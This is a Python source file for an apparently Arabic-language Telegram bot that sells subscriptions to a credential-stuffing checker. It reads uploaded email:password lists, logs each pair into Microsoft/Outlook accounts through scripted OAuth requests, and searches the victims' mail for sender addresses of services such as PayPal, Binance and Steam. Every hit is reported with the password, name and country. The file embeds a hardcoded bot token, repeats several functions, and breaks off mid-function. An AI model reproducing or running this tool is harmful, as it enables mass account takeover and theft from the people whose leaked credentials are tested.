import requests
import uuid
from concurrent.futures import ThreadPoolExecutor
import telebot
import random
import os
from telebot import types
import time
import sqlite3
from datetime import datetime, timedelta
import threading

# Global variables
bot = None
executor = ThreadPoolExecutor(max_workers=50)
user_data = {}  # Initialize user_data dictionary

# Initialize bot
tok = '7521715607:AAHYrSNCta8qWaNw40HavmTHKhGYtL_xGD8'
try:
    bot = telebot.TeleBot(tok)
except Exception as e:
    print(f"Error: {e}")
    exit()

@bot.message_handler(commands=['commands'])
def show_all_commands(message):
    if message.from_user.id == 7172101608:  # Replace with your admin ID
        commands_list = """
        ⛦ ──── ⋆⋅☆⋅⋆ ──── ⛦
        𓃠 جميع الأوامر المتاحة 𓃠
        ⋆⋅☆⋅⋆ ──── ⛦ ──── ⋆⋅☆⋅⋆

        /start - بدء استخدام البوت
        /help - عرض الأوامر المتاحة للمستخدمين
        /prices - عرض الأسعار
        /select_services - اختيار التطبيقات للفحص
        /my_ref_link - إنشاء رابط إحالة خاص بك
        /points - عرض النقاط الخاصة بك
        /redeem - استرداد النقاط مقابل وقت إضافي
        /discount - استرداد نقاط مقابل خصم
        /refer - إحالة صديق
        /active_subscriptions - عرض المستخدمين الذين لديهم اشتراكات نشطة (للمالك فقط)
        /add_subscription - إضافة أو تجديد اشتراك (للمالك فقط)
        /remove_subscription - إزالة اشتراك (للمالك فقط)
        /add_points - إضافة نقاط للمستخدم (للمالك فقط)
        /commands - عرض جميع الأوامر (للمالك فقط)
        /create_code لانشاء كود 
        /redeems لاستخدام الكود

        ⛦ ──── ⋆⋅☆⋅⋆ ──── ⛦
        ✧ Designed by: @j6j66666
        """
        bot.reply_to(message, commands_list)
    else:
        bot.reply_to(message, "ليس لديك صلاحية لتنفيذ هذا الأمر.")

# Initialize SQLite database
def init_db():
    conn = sqlite3.connect('subscriptions.db', check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS subscriptions (
        user_id INTEGER PRIMARY KEY,
        expiry_date TEXT
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS referrals (
        referrer_id INTEGER,
        referred_id INTEGER,
        PRIMARY KEY (referrer_id, referred_id),
        FOREIGN KEY (referrer_id) REFERENCES subscriptions(user_id),
        FOREIGN KEY (referred_id) REFERENCES subscriptions(user_id)
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS points (
        user_id INTEGER PRIMARY KEY,
        points INTEGER DEFAULT 0,
        FOREIGN KEY (user_id) REFERENCES subscriptions(user_id)
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS codes (
        code TEXT PRIMARY KEY,
        hours INTEGER,
        expiry_date TEXT,
        used INTEGER DEFAULT 0
    )
    ''')
    
    conn.commit()
    return conn, cursor

# Initialize the database
conn, cursor = init_db()

# Function to get database connection
def get_db_connection():
    global conn, cursor
    if conn is None or conn.closed:
        conn = sqlite3.connect('subscriptions.db', check_same_thread=False)
        cursor = conn.cursor()
    return conn, cursor

# Function to add or renew subscription
def add_subscription(user_id, hours):
    conn, cursor = get_db_connection()
    expiry_date = datetime.now() + timedelta(hours=hours)
    try:
        cursor.execute('''
        INSERT OR REPLACE INTO subscriptions (user_id, expiry_date)
        VALUES (?, ?)
        ''', (user_id, expiry_date.isoformat()))
        conn.commit()
    except sqlite3.Error as e:
        print(f"Error adding subscription: {e}")
        conn.rollback()

# Function to remove subscription
def remove_subscription(user_id):
    conn, cursor = get_db_connection()
    try:
        cursor.execute('DELETE FROM subscriptions WHERE user_id = ?', (user_id,))
        conn.commit()
    except sqlite3.Error as e:
        print(f"Error removing subscription: {e}")
        conn.rollback()

# Function to check subscription
def check_subscription(user_id):
    conn, cursor = get_db_connection()
    try:
        cursor.execute('SELECT expiry_date FROM subscriptions WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        if result:
            expiry_date = datetime.fromisoformat(result[0])
            if datetime.now() < expiry_date:
                return True
        return False
    except sqlite3.Error as e:
        print(f"Error checking subscription: {e}")
        return False

# Function to create a new code
def create_code(hours):
    conn, cursor = get_db_connection()
    try:
        code = str(uuid.uuid4()).replace("-", "")[:12].upper()
        expiry_date = datetime.now() + timedelta(days=30)  # الكود صالح لمدة 30 يومًا
        cursor.execute('''
        INSERT INTO codes (code, hours, expiry_date)
        VALUES (?, ?, ?)
        ''', (code, hours, expiry_date.isoformat()))
        conn.commit()
        return code
    except sqlite3.Error as e:
        print(f"Error creating code: {e}")
        conn.rollback()
        return None

# List of services to check
services = {
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
    "PUBG": "noreply@pubgmobile.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "PayPal": "service@paypal.com.br",
    "Binance": "do-not-reply@ses.binance.com",
    "Netflix": "info@account.netflix.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Supercell": "noreply@id.supercell.com",
    "EpicGames": "help@acct.epicgames.com",
    "Spotify": "no-reply@spotify.com",
    "Rockstar": "noreply@rockstargames.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "Microsoft": "account-security-noreply@accountprotection.microsoft.com",
    "Steam": "noreply@steampowered.com",
    "Roblox": "accounts@roblox.com",
    "EA Sports": "EA@e.ea.com",
    "Apple": "no_reply@email.apple.com",
    "Google": "no-reply@accounts.google.com",
    "Amazon": "auto-confirm@amazon.com",
    "Yahoo": "no-reply@cc.yahoo-inc.com",
    "LinkedIn": "no-reply@linkedin.com",
    "Dropbox": "no-reply@dropbox.com",
    "Slack": "no-reply@slack.com",
    "Trello": "no-reply@trello.com",
    "GitHub": "noreply@github.com",
    "WhatsApp": "no-reply@whatsapp.com",
    "Telegram": "no-reply@telegram.org",
    "Discord": "no-reply@discord.com",
    "Snapchat": "no-reply@snapchat.com",
    "Reddit": "no-reply@reddit.com",
    "Tumblr": "no-reply@tumblr.com",
    "Pinterest": "no-reply@pinterest.com",
    "Quora": "no-reply@quora.com",
    "Medium": "no-reply@medium.com",
    "Wikipedia": "no-reply@wikimedia.org",
    "YouTube": "no-reply@youtube.com",
    "Vimeo": "no-reply@vimeo.com",
    "Dailymotion": "no-reply@dailymotion.com",
    "Twitch": "no-reply@twitch.tv",
    "SoundCloud": "no-reply@soundcloud.com",
    "Behance": "no-reply@behance.net",
    "Google Drive": "no-reply@drive.google.com",
    "Webex": "no-reply@webex.com",
    "Zoom": "no-reply@zoom.us",
    "freefire": "noreply@ff.garena.com",
    "bitcoin": "noreply@bitcoin.com",
    "miniclip": "noreply@miniclip.com",
    "yallaludo": "noreply@yallaludo.com",
}

# Initialize user data
def init_user_data(chat_id):
    if chat_id not in user_data:
        user_data[chat_id] = {
            "a": 0,
            "b": 0,
            "combo_queue": [],
            "current_files": set(),
            "selected_services": set(),
            "status_message_id": None,
        }

# Function to get user data
def get_user_data(chat_id):
    return user_data.get(chat_id, {})

# Function to update user data
def update_user_data(chat_id, key, value):
    if chat_id in user_data:
        user_data[chat_id][key] = value

# Function to get info
def get_info(em, pw, tok, cid, chat_id):
    hd = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": f"Bearer {tok}",
        "X-AnchorMailbox": f"CID:{cid}",
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    try:
        res = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=hd).json()
        inf_nm = (res.get('names', []))
        inf_loc = (res.get('accounts', []))
        nm = inf_nm[0]['displayName']
        loc = inf_loc[0]['location']
        url = f"https://outlook.live.com/owa/{em}/startupdata.ashx?app=Mini&n=0"
        headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": f"{cid}",
            "x-req-source": "Mini",
            "authorization": f"Bearer {tok}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
            "action": "StartupData",
            "x-owa-correlationid": f"{cid}",
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9"
        }
        resp = requests.post(url, headers=headers, data="").text
        print(resp)  # طباعة الرد لفحصه

        verified_services = []
        selected_services = get_user_data(chat_id)["selected_services"]
        for service, email in services.items():
            if service in selected_services and email in resp:
                verified_services.append(f"✅ {service}")

        if not verified_services:
            print(f"الحساب {em} لا يحتوي على الت��بيقات المحددة.")
            return

        verified_list = "\n".join(verified_services)
        info_text = f"""
        ⛦ ──── ⋆⋅☆⋅⋆ ──── ⛦
𓃠 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗙𝗢 𓃠
⋆⋅☆⋅⋆ ──── ⛦ ──── ⋆⋅☆⋅⋆

✧ 𝗘𝗺𝗮𝗶𝗹: ✉️〔  {em} 〕
✧ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱:🔑 〔 {pw} 〕

⛦ ──── ⋆⋅☆⋅⋆ ──── ⛦
𓃠 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢 𓃠
⋆⋅☆⋅⋆ ──── ⛦ ──── ⋆⋅☆⋅⋆

✧ 𝗡𝗮𝗺𝗲: 〔 🪪 {nm} 〕
✧ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: 🌍〔  {loc} 〕

⛦ ──── ⋆⋅☆⋅⋆ ──── ⛦
𓃠 𝗟𝗜𝗡𝗞𝗜𝗡𝗚 𓃠
⋆⋅☆⋅⋆ ──── ⛦ ──── ⋆⋅☆⋅⋆

{verified_list}

⛦ ──── ⋆⋅☆⋅⋆ ──── ⛦
✧ 𝗗𝗲𝘀𝗶𝗴𝗻𝗲𝗱 𝗯𝘆: @j6j66666
"""
        # إرسال الصورة مع النص والزر
        photo_url = "https://t.me/wallpapers_photos_pictures/445"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("𓌹 zeyad 𓌺", url="http://t.me/j6j66666"))
        bot.send_photo(chat_id, photo_url, caption=info_text, reply_markup=markup, parse_mode='Markdown')

    except Exception as e:
        print(f"{e}")
        bot.send_message(chat_id, "حدث خطأ أثناء معالجة البيانات.")

# Function to get token
def get_tok(em, pw, cook, hh, chat_id):
    try:
        code = hh.get('Location').split('code=')[1].split('&')[0]
        cid = cook.get('MSPCID').upper()
        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
        tok = response.json()["access_token"]
        get_info(em, pw, tok, cid, chat_id)
    except Exception as e:
        print(f"{e}")

# Function to login
def login(em, pw, url, ppft, ad, msp_req, uaid, ref_tok, msp_ok, oprms, chat_id):
    user_data = get_user_data(chat_id)
    try:
        login_data = f"i13=1&login={em}&loginfmt={em}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pw}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        
        content_length = str(len(login_data))
        hd = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": content_length,
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"{ad}haschrome=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"MSPRequ={msp_req};uaid={uaid}; RefreshTokenSso={ref_tok}; MSPOK={msp_ok}; OParams={oprms}; MicrosoftApplicationsTelemetryDeviceId={uuid.uuid4()}"
        }
        res = requests.post(url, data=login_data, headers=hd, allow_redirects=False)
        cookies = res.cookies.get_dict()
        headers = res.headers
        if any(key in cookies for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
            get_tok(em, pw, cookies, headers, chat_id)
            user_data["a"] += 1
            update_status_message(chat_id)  
            print(f'\033[2;32m{user_data["a"]} - good : {em} | {pw}')
        else:
            user_data["b"] += 1
            update_status_message(chat_id)  
            print(f'\033[2;31m{user_data["b"]} - bad: {em} | {pw}')
    except Exception as e:
        print(f"{e}")

# Function to get values
def get_vals(em, pw, chat_id):
    hd = {
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "return-client-request-id": "false",
        "client-request-id": str(uuid.uuid4()),
        "x-ms-sso-ignore-sso": "1",
        "correlation-id": str(uuid.uuid4()),
        "x-client-ver": "1.1.0+9e54a0d1",
        "x-client-os": "28",
        "x-client-sku": "MSAL.xplat",
        "x-client-src-sku": "MSAL.xplat.android",
        "X-Requested-With": "com.microsoft.outlooklite",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        resp = requests.get(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + str(
                em) + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers=hd)
        cookies = resp.cookies.get_dict()
        url = resp.text.split("urlPost:'")[1].split("'")[0]
        ppft = resp.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
        ad = resp.url.split('haschrome=1')[0]
        msp_req = cookies['MSPRequ']
        uaid = cookies['uaid']
        ref_tok = cookies['RefreshTokenSso']
        msp_ok = cookies['MSPOK'],
        oprms = cookies['OParams']
        login(em, pw, url, ppft, ad, msp_req, uaid, ref_tok, msp_ok, oprms, chat_id)
    except Exception as e:
        print(f"{e}")
        get_vals(em, pw, chat_id)

# Function to process combo
def process_combo(file_path, chat_id):
    user_data = get_user_data(chat_id)
    try:
        with open(file_path, "r") as f:
            for line in f:
                try:
                    if ':' in line:
                        em = line.strip().split(':')[0]
                        pw = line.strip().split(':')[1]
                        executor.submit(get_vals, em, pw, chat_id)
                        time.sleep(5)  # إضافة تأخير 10 ثواني
                    else:
                        pass
                except Exception as e:
                    print(f"{e}")
    except FileNotFoundError:
        print(f"خطأ: الملف '{file_path}' غير موجود.")
    except Exception as e:
        print(f"error :{e}")
    finally:
        user_data["current_files"].discard(file_path)

# Function to update status message
is_scanning = True

# تعديل وظيفة update_status_message لإضافة زر إيقاف الفحص
def update_status_message(chat_id):
    user_data = get_user_data(chat_id)
    text = f"""
🚀━━━━━━━━━━━━━━━━━━━━🚀
  ✅ 𝗚𝗢𝗢𝗗: ✅ <code>{user_data["a"]}</code>
  ❌ 𝗕𝗔𝗗: ❌ <code>{user_data["b"]}</code>
🚀━━━━━━━━━━━━━━━━━━━━🚀
"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    button_good = types.InlineKeyboardButton(text=f"GOOD 🟢: {user_data['a']}", callback_data="none")
    button_bad = types.InlineKeyboardButton(text=f"BAD 💔: {user_data['b']}", callback_data="none")
    stop_button = types.InlineKeyboardButton(text="إيقاف الفحص ⛔️", callback_data="stop_scan")
    markup.add(button_good, button_bad, stop_button)
    
    try:
        if user_data["status_message_id"]:
            bot.edit_message_text(chat_id=chat_id, message_id=user_data["status_message_id"], text=text, reply_markup=markup, parse_mode="HTML")
        else:
            msg = bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
            user_data["status_message_id"] = msg.message_id
    except Exception as e:
        print(f"خطأ في تحديث الرسالة: {e}")

# إضافة معالج لزر إيقاف الفحص
@bot.callback_query_handler(func=lambda call: call.data == "stop_scan")
def handle_stop_scan(call):
    global is_scanning
    chat_id = call.message.chat.id
    is_scanning = False
    bot.answer_callback_query(call.id, "تم إيقاف الفحص بنجاح.")
    bot.send_message(chat_id, "تم إيقاف الفحص.")

# تعديل وظيفة process_combo لإيقاف الفحص عند الضغط على الزر
def process_combo(file_path, chat_id):
    global is_scanning
    user_data = get_user_data(chat_id)
    try:
        with open(file_path, "r") as f:
            for line in f:
                if not is_scanning:
                    break  # إيقاف الفحص إذا تم الضغط على زر الإيقاف
                try:
                    if ':' in line:
                        em = line.strip().split(':')[0]
                        pw = line.strip().split(':')[1]
                        executor.submit(get_vals, em, pw, chat_id)
                        time.sleep(5)  # إضافة تأخير 5 ثواني
                    else:
                        pass
                except Exception as e:
                    print(f"{e}")
    except FileNotFoundError:
        print(f"خطأ: الملف '{file_path}' غير موجود.")
    except Exception as e:
        print(f"error :{e}")
    finally:
        user_data["current_files"].discard(file_path)
        is_scanning = True  

# Function to start processing
def start_processing(chat_id):
    user_data = get_user_data(chat_id)
    update_status_message(chat_id)

    while user_data["combo_queue"]:
        combo_file = user_data["combo_queue"].pop(0)
        if combo_file in user_data["current_files"]:
            process_combo(combo_file, chat_id)
        else:
            print(f" {combo_file}:")
    print("تم فحص جميع الملفات")

# Command handler for /create_code
@bot.message_handler(commands=['create_code'])
def create_code_command(message):
    if message.from_user.id == 7172101608:  # استبدل بمعرف المالك
        try:
            _, hours = message.text.split()
            hours = int(hours)
            code = create_code(hours)
            expiry_date = datetime.now() + timedelta(days=30)
            bot.reply_to(message, f"""
𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀

𝗣𝗟𝗔𝗡 ➜ 𝗩𝗜𝗣

𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}

𝗞𝗘𝗬 ➜ {code}

𝗨𝗦𝗘 /redeems [𝗞𝗘𝗬]
""")
        except Exception as e:
            bot.reply_to(message, f"خطأ: {e}")
    else:
        bot.reply_to(message, "ليس لديك صلاحية لتنفيذ هذا الأمر.")

# Command handler for /add_subscription
@bot.message_handler(commands=['add_subscription'])
def add_subscription_command(message):
    if message.from_user.id == 7172101608:  # Replace with your admin ID
        try:
            _, user_id, hours = message.text.split()
            user_id = int(user_id)
            hours = int(hours)
            add_subscription(user_id, hours)
            bot.reply_to(message, f"تم تجديد اشتراك المستخدم {user_id} لمدة {hours} ساعة. لديه {get_points(user_id)} نقطة.")
        except Exception as e:
            bot.reply_to(message, f"خطأ: {e}")
    else:
        bot.reply_to(message, "ليس لديك صلاحية لتنفيذ هذا الأمر.")
        
# Command handler for /remove_subscription
@bot.message_handler(commands=['remove_subscription'])
def remove_subscription_command(message):
    if message.from_user.id == 7172101608:  # Replace with your admin ID
        try:
            _, user_id = message.text.split()
            user_id = int(user_id)
            remove_subscription(user_id)
            bot.reply_to(message, f"تم إزالة اشتراك المستخدم {user_id}. لديه {get_points(user_id)} نقطة.")
        except Exception as e:
            bot.reply_to(message, f"خطأ: {e}")
    else:
        bot.reply_to(message, "ليس لديك صلاحية لتنفيذ هذا الأمر.")

# Function to create a new code
def create_code(hours):
    try:
        # تحقق من أن الاتصال مفتوح
        if conn is None or conn.closed:
            conn = sqlite3.connect('subscriptions.db', check_same_thread=False)
            cursor = conn.cursor()

        code = str(uuid.uuid4()).replace("-", "")[:12].upper()
        expiry_date = datetime.now() + timedelta(days=30)  # الكود صالح لمدة 30 يومًا
        cursor.execute('''
        INSERT INTO codes (code, hours, expiry_date)
        VALUES (?, ?, ?)
        ''', (code, hours, expiry_date.isoformat()))
        conn.commit()
        return code
    except sqlite3.Error as e:
        print(f"Error creating code: {e}")
        conn.rollback()
        return None
    
    
# Function to redeem a code
def redeems_code(user_id, code):
    cursor.execute('SELECT hours, expiry_date, used FROM codes WHERE code = ?', (code,))
    result = cursor.fetchone()
    if result:
        hours, expiry_date, used = result
        if datetime.now() < datetime.fromisoformat(expiry_date) and not used:
            add_subscription(user_id, hours)
            cursor.execute('UPDATE codes SET used = 1 WHERE code = ?', (code,))
            conn.commit()
            return True
    return False

# Function to get subscription hours
def get_subscription_hours(user_id):
    cursor.execute('SELECT expiry_date FROM subscriptions WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    if result:
        expiry_date = datetime.fromisoformat(result[0])
        remaining_time = expiry_date - datetime.now()
        return int(remaining_time.total_seconds() // 3600)
    return 0    
            
# Command handler for /check_subscription
@bot.message_handler(commands=['check_subscription'])
def check_subscription_command(message):
    try:
        _, user_id = message.text.split()
        user_id = int(user_id)
        if check_subscription(user_id):
            bot.reply_to(message, f"المستخدم {user_id} لديه اشتراك فعال. لديه {get_points(user_id)} نقطة.")
        else:
            bot.reply_to(message, f"المستخدم {user_id} ليس لديه اشتراك فعال. لديه {get_points(user_id)} نقطة.")
    except Exception as e:
        bot.reply_to(message, f"خطأ: {e}")
        
    # Function to add points to a user
# Function to add points to a user
def add_points(user_id, points):
    try:
        cursor.execute('''
        INSERT OR REPLACE INTO points (user_id, points)
        VALUES (?, COALESCE((SELECT points FROM points WHERE user_id = ?), 0) + ?)
        ''', (user_id, user_id, points))
        conn.commit()
    except sqlite3.Error as e:
        print(f"Error adding points: {e}")
        conn.rollback()

# Function to get user points
def get_points(user_id):
    try:
        cursor.execute('SELECT points FROM points WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        return max(result[0], 0) if result else 0
    except sqlite3.Error as e:
        print(f"Error getting points: {e}")
        return 0

# Function to redeem points for subscription time
def redeem_points(user_id):
    points = get_points(user_id)
    if points >= 50:  # 50 نقطة = ساعة إضافية من الاشتراك
        add_subscription(user_id, 1)
        add_points(user_id, -50)
        return True
    return False

@bot.message_handler(commands=['refer'])
def refer_friend(message):
    chat_id = message.chat.id
    referrer_id = message.from_user.id
    
    if len(message.text.split()) == 2:
        try:
            referred_id = int(message.text.split()[1])
            
            if referred_id == referrer_id:
                bot.reply_to(message, "لا يمكنك إحالة نفسك.")
                return
            
            # التحقق من أن الإحالة لم تتم من قبل
            cursor.execute('SELECT * FROM referrals WHERE referrer_id = ? AND referred_id = ?', (referrer_id, referred_id))
            if cursor.fetchone():
                bot.reply_to(message, "لقد قمت بإحالة هذا المستخدم من قبل.")
                return
            
            # إضافة الإحالة إلى قاعدة البيانات
            cursor.execute('INSERT INTO referrals (referrer_id, referred_id) VALUES (?, ?)', (referrer_id, referred_id))
            conn.commit()
            
            # منح النقاط للمستخدم الذي قام بالإحالة والمستخدم الذي تمت إحالته
            add_points(referrer_id, 10)  # منح 10 نقطة للمستخدم الذي قام بالإحالة
            add_points(referred_id, 0)  # منح 0 نقطة للمستخدم الذي تمت إحالته
            
            bot.reply_to(message, "تمت الإحالة بنجاح! لقد حصل صديقك علي 10 نقاط.")
        
        except ValueError:
            bot.reply_to(message, "معرف المستخدم غير صحيح.")
        except Exception as e:
            bot.reply_to(message, f"حدث خطأ أثناء معالجة الإحالة: {e}")
    else:
        bot.reply_to(message, "استخدم الأمر كالتالي: /refer <user_id>")
        
@bot.message_handler(commands=['redeem'])
def redeem_points_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if redeem_points(user_id):
        bot.reply_to(message, f"تم استرداد 50 نقطة مقابل ساعة إضافية من الاشتراك. لديك الآن {get_points(user_id)} نقطة.")
    else:
        bot.reply_to(message, f"ليس لديك نقاط كافية لاستردادها. لديك {get_points(user_id)} نقطة.")
        

       
@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    points = get_points(user_id)
    bot.reply_to(message, f"لديك {points} نقطة.")
    
@bot.message_handler(commands=['discount'])
def redeem_discount(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    points = get_points(user_id)
    if points >= 200:  # 200 نقطة = خصم 10% على الاشتراك القادم
        add_points(user_id, -200)
        bot.reply_to(message, f"تم استرداد 200 نقطة مقابل خصم 10% على الاشتراك القادم. لديك الآن {get_points(user_id)} نقطة.")
    else:
        bot.reply_to(message, f"ليس لديك نقاط كافية لاسترداد الخصم. لديك {get_points(user_id)} نقطة.")
        
# ... (الكود السابق يبقى كما هو)

# Function to get all active subscriptions
def get_active_subscriptions():
    cursor.execute('SELECT user_id, expiry_date FROM subscriptions')
    results = cursor.fetchall()
    active_users = []
    for user_id, expiry_date in results:
        expiry_date = datetime.fromisoformat(expiry_date)
        if datetime.now() < expiry_date:
            active_users.append(user_id)
    return active_users

# Command handler for /active_subscriptions
@bot.message_handler(commands=['active_subscriptions'])
def active_subscriptions_command(message):
    if message.from_user.id == 7172101608:  # استبدل بمعرفك
        try:
            active_users = get_active_subscriptions()
            if active_users:
                active_users_list = "\n".join([f"👤 User ID: {user_id} - Points: {get_points(user_id)}" for user_id in active_users])
                bot.reply_to(message, f"المستخدمون الذين لديهم اشتراكات نشطة:\n{active_users_list}")
            else:
                bot.reply_to(message, "لا يوجد مستخدمون لديهم اشتراكات نشطة حالياً.")
        except Exception as e:
            bot.reply_to(message, f"حدث خطأ أثناء استرداد البيانات: {e}")
    else:
        bot.reply_to(message, "ليس لديك صلاحية لتنفيذ هذا الأمر.")

def create_code(hours):
    try:
        conn, cursor = get_db_connection()
        code = str(uuid.uuid4()).replace("-", "")[:12].upper()
        expiry_date = datetime.now() + timedelta(days=30)  # الكود صالح لمدة 30 يومًا
        cursor.execute('''
        INSERT INTO codes (code, hours, expiry_date)
        VALUES (?, ?, ?)
        ''', (code, hours, expiry_date.isoformat()))
        conn.commit()
        return code
    except sqlite3.Error as e:
        print(f"Error creating code: {e}")
        conn.rollback()
        return None        
def remove_points(user_id, points):
    try:
        cursor.execute('''
        UPDATE points
        SET points = points - ?
        WHERE user_id = ?
        ''', (points, user_id))
        conn.commit()
        return True
    except sqlite3.Error as e:
        print(f"Error removing points: {e}")
        conn.rollback()
        return False
@bot.message_handler(commands=['remove_points'])
def remove_points_command(message):
    if message.from_user.id == 7172101608:  # استبدل بمعرف المالك
        try:
            parts = message.text.split()
            if len(parts) != 3:
                bot.reply_to(message, "الرجاء إدخال الأمر بشكل صحيح: /remove_points <user_id> <عدد النقاط>")
                return
            
            user_id = int(parts[1])
            points = int(parts[2])
            
            if remove_points(user_id, points):
                bot.reply_to(message, f"تم إزالة {points} نقطة من حساب المستخدم {user_id} بنجاح. لديه الآن {get_points(user_id)} نقطة.")
            else:
                bot.reply_to(message, "حدث خطأ أثناء إزالة النقاط.")
        except ValueError:
            bot.reply_to(message, "الرجاء إدخال معرف مستخدم وعدد نقاط صحيحين.")
        except Exception as e:
            bot.reply_to(message, f"خطأ: {e}")
    else:
        bot.reply_to(message, "ليس لديك صلاحية لتنفيذ هذا الأمر.")        
                        
@bot.message_handler(commands=['add_points'])
def add_points_command(message):
    # التحقق من أن المرسل هو المالك (استبدل 7172101608 بمعرف المالك)
    if message.from_user.id == 7172101608:
        try:
            # تقسيم النص للحصول على معرف المستخدم وعدد النقاط
            _, user_id, points = message.text.split()
            user_id = int(user_id)
            points = int(points)
            
            # إضافة النقاط للمستخدم
            add_points(user_id, points)
            
            # إرسال رسالة تأكيد
            bot.reply_to(message, f"تم إضافة {points} نقطة للمستخدم {user_id} بنجاح. لديه الآن {get_points(user_id)} نقطة.")
        except Exception as e:
            bot.reply_to(message, f"خطأ: {e}")
    else:
        bot.reply_to(message, "ليس لديك صلاحية لتنفيذ هذا الأمر.")        

# Initialize user data
def init_user_data(chat_id):
    if chat_id not in user_data:
        user_data[chat_id] = {
            "a": 0,
            "b": 0,
            "combo_queue": [],
            "current_files": set(),
            "selected_services": set(),
            "status_message_id": None,
        }

# Function to get user data
def get_user_data(chat_id):
    return user_data.get(chat_id, {})

# Function to update user data
def update_user_data(chat_id, key, value):
    if chat_id in user_data:
        user_data[chat_id][key] = value

# Function to add or renew subscription
def add_subscription(user_id, hours):
    expiry_date = datetime.now() + timedelta(hours=hours)
    try:
        cursor.execute('''
